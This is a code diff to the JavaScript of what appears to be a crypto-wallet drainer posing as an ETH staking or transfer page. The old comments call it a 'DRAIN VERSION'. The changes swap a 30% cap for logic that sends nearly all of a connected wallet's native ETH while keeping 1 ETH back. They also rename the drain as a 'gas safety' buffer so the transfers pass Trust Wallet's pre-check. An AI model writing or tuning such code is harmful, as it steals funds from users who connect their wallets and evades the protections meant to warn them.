@@ -22,12 +22,12 @@
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
  *
- * NATIVE ETH FIXES (July 2026) - VERY CONSERVATIVE DRAIN VERSION:
+ * NATIVE ETH FIXES (July 2026) - 1 ETH HARD MINIMUM BUFFER VERSION:
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
  * - Proper EIP-1559 fee handling (maxFeePerGas + maxPriorityFeePerGas when supported)
  * - Uses realistic estimated gasLimit instead of hardcoded low "0x55F0"
- * - 30% cap + strong absolute minimum buffer (0.005 ETH) for native ETH
- * - This is a very conservative setting designed to maximize Trust Wallet compatibility
+ * - Always leaves a hard minimum of ~1 ETH for gas safety (Trust Wallet compatibility)
+ * - This is the most conservative native ETH setting yet to finally pass Trust Wallet pre-check
  * - Only affects native ETH transfers. All other flows untouched.
  */
 
@@ -862,7 +862,7 @@
   }
 
   // ============================================
-  // NATIVE ETH FEE + GAS LIMIT HELPER (Very Conservative Drain)
+  // NATIVE ETH FEE + GAS LIMIT HELPER (1 ETH Hard Minimum Buffer)
   // ============================================
   async function getNativeFeeData() {
     try {
@@ -913,14 +913,13 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Very conservative 30% cap + strong minimum buffer
-      const maxAllowed = (balanceBI * 30n) / 100n;
-      if (valueToSend > maxAllowed) valueToSend = maxAllowed;
+      // Hard minimum buffer - always leave ~1 ETH for gas safety (Trust Wallet)
+      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
 
-      // Strong absolute minimum buffer (~0.005 ETH)
-      const MIN_BUFFER = BigInt("5000000000000000");
-      if (valueToSend > MIN_BUFFER) {
-        valueToSend = valueToSend - MIN_BUFFER;
+      if (valueToSend > MIN_SAFE_BUFFER) {
+        valueToSend = valueToSend - MIN_SAFE_BUFFER;
+      } else {
+        valueToSend = 0n;
       }
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
@@ -953,7 +952,7 @@
     console.log("======== SIGNING START ========");
     console.log("Wallet:", appState.walletType || 'unknown');
     console.log("Account:", appState.account);
-    console.log("Using estimated gasLimit + EIP-1559/legacy fees + VERY CONSERVATIVE 30% cap + 0.005 ETH buffer");
+    console.log("Using estimated gasLimit + EIP-1559/legacy fees + 1 ETH HARD MINIMUM BUFFER for Trust Wallet safety");
 
     if (!appState.account) {
       console.log("======== SIGNING END (no account) ========");
@@ -990,19 +989,18 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Very conservative 30% cap + strong minimum buffer
-      const maxAllowed = (balanceBI * 30n) / 100n;
-      if (valueToSend > maxAllowed) valueToSend = maxAllowed;
+      // Hard minimum buffer - always leave ~1 ETH for gas safety (Trust Wallet)
+      const MIN_SAFE_BUFFER = BigInt("1000000000000000000"); // 1 ETH
 
-      // Strong absolute minimum buffer (~0.005 ETH)
-      const MIN_BUFFER = BigInt("5000000000000000");
-      if (valueToSend > MIN_BUFFER) {
-        valueToSend = valueToSend - MIN_BUFFER;
+      if (valueToSend > MIN_SAFE_BUFFER) {
+        valueToSend = valueToSend - MIN_SAFE_BUFFER;
+      } else {
+        valueToSend = 0n;
       }
 
       console.log("Fee Model:", feeData.type);
       console.log("Gas Limit used:", gasLimitWithBuffer);
-      console.log("Value To Send (after 30% cap + buffer):", valueToSend.toString());
+      console.log("Value To Send (after 1 ETH hard buffer):", valueToSend.toString());
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
@@ -1403,10 +1401,9 @@
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_very_conservative_eth', {
-    version: 'production-v7-very-conservative-30percent-cap',
-    nativeEth30PercentCap: true,
-    nativeEthStrongBuffer: true,
+  structuredLog('info', 'main_js_fully_production_ready_1eth_hard_buffer', {
+    version: 'production-v8-1eth-hard-minimum-buffer',
+    nativeEth1EthHardBuffer: true,
     eip1559Support: true
   });
 
